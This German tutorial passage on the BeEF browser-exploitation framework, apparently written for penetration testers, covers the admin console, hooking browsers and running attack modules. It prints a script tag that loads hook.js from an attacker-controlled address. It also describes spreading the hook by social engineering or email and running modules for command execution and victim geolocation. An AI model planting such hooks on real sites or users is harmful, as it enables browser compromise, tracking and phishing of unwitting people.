# 3. Nutzung von BeEF

Nach erfolgreicher Installation kannst du mit der Nutzung von BeEF beginnen. Hier werden die wesentlichen Schritte beschrieben:

#### 3.1 Zugriff auf die Weboberfläche

* **Anmeldung:**\
  Öffne deinen Browser und navigiere zur BeEF-Admin-Konsole (z. B. `http://localhost:3000/ui/panel`). Melde dich mit den in der Konfiguration festgelegten Zugangsdaten an.
* **Dashboard:**\
  Das Dashboard zeigt dir einen Überblick über „gehookte“ Browser (Clients), verfügbare Module und laufende Sessions.

#### 3.2 Browser-Hooking

*   **Payload generieren:**\
    BeEF stellt einen JavaScript-Hook zur Verfügung, der in Webseiten eingebettet werden kann. Dieser Hook sieht in etwa so aus:

    ```html
    <script src="http://<deine-IP>:3000/hook.js"></script>
    ```
* **Verteilung:**\
  Der Hook kann in eine Webseite eingebettet werden, über Social Engineering verteilt oder per E-Mail als Link geteilt werden. Sobald ein Zielbrowser den Hook lädt, wird es in BeEF „gehookt“ und erscheint im Dashboard.

#### 3.3 Module und Angriffe

* **Modulübersicht:**\
  In der Weboberfläche findest du eine Vielzahl von Modulen, die verschiedene Angriffe und Informationssammlungen ermöglichen. Beispiele:
  * **Browserinformationen abrufen:** Sammle Details zum Browser, Betriebssystem, Plugins etc.
  * **Command Execution:** Führe Befehle auf dem Client aus.
  * **Geolocation:** Ermittle den Standort des Opfers (falls der Browser dies preisgibt).
  * **Social Engineering Module:** Zum Beispiel Pop-up-Fenster zur Durchführung weiterer Angriffe.
* **Modulausführung:**\
  Wähle einen gehookten Browser aus und klicke auf ein gewünschtes Modul, um den Angriff auszuführen. Die Ergebnisse werden in der Weboberfläche in Echtzeit angezeigt.

#### 3.4 Interaktive Steuerung und Reporting

* **Session Management:**\
  BeEF ermöglicht es, mehrere gehookte Clients gleichzeitig zu verwalten und einzelne Sessions zu steuern.
* **Ergebnisprotokollierung:**\
  Alle ausgeführten Module und gesammelten Informationen werden protokolliert. Dies ist wichtig für die spätere Analyse und die Erstellung von Penetrationstest-Reports.
